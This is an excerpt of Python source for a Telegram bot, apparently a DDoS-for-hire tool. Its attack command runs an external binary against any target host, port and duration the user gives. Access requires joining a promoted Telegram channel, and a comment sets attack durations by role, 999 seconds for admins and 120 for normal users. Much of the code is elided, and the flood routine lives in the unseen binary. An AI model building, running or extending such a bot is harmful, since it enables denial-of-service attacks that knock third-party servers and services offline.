...
# Required Channels
REQUIRED_CHANNELS = ["@GYRANGEupdates"]
...
def start_attack(target, port, duration, message):
    ...
    try:
        ...
        attack_command = f"{os.path.abspath('./adarsh')} {target} {port} {duration} 100"
...
def handle_attack(message):
    ...
    if not is_member(user_id):
        bot.reply_to(message, f"❌ You must join [GYRANGEupdates](https://t.me/GYRANGEupdates) before using this command.", parse_mode="Markdown")
        return
    ...
    try:
        ...
        # Agar user group admin hai toh 999 seconds, agar normal user hai toh 120 seconds
...
Official Channel :- https://t.me/GYRANGEupdates
'''
